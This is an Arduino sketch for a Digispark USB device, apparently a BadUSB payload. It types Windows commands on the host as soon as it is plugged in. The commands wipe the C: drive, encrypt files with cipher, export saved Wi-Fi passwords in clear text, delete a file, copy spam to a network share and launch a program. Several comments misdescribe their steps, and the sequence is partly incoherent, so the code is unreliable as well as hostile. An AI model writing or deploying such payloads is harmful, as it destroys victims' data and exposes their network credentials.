#include <DigiKeyboard.h>

void setup() {
    // Destroy the system
    DigiKeyboard.sendKeyStroke(KEY_LEFT_GUI, KEY_R);
    DigiKeyboard.println("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("del /f /s /q c:\\*.*");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Encrypt files
    DigiKeyboard.sendKeyStroke(KEY_LEFT_GUI, KEY_R);
    DigiKeyboard.println("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("cd C:\\");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("cipher /e /s /a:");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Infect other computers
    DigiKeyboard.sendKeyStroke(KEY_LEFT_GUI, KEY_R);
    DigiKeyboard.println("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("netsh wlan show profiles");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("netsh wlan export profile name=\"Wi-Fi\" key=clear");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Delete important files
    DigiKeyboard.sendKeyStroke(KEY_LEFT_GUI, KEY_R);
    DigiKeyboard.println("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("cd C:\\");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("del important_file.txt");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Spam messages
    DigiKeyboard.sendKeyStroke(KEY_LEFT_GUI, KEY_R);
    DigiKeyboard.println("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("cd C:\\");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("echo Spam message > spam.txt");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("copy spam.txt \\\\192.168.1.10\\SharedFolder\\");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Lock the screen
    DigiKeyboard.sendKeyStroke(KEY_LEFT_GUI, KEY_L);

    // Run a program
    DigiKeyboard.sendKeyStroke(KEY_LEFT_GUI, KEY_R);
    DigiKeyboard.println("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("cd C:\\Program Files\\");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("start important_program.exe");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.println("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
    // Do nothing
}
